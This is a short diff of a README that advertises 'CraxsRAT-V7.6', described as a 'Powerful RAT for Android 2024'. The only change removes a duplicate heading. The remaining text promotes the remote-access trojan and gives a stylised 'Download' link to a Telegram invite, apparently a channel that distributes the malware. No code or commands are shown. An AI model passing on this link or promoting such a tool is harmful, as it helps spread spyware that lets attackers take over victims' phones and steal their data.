@@ -1,8 +1,6 @@
 # CraxsRAT-V7.6
 Powerful RAT for Android 2024
 
-## CraxsRAT
-
 # 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://t.me/+X-3jumlwIe1lOTky)
 
 ## New:
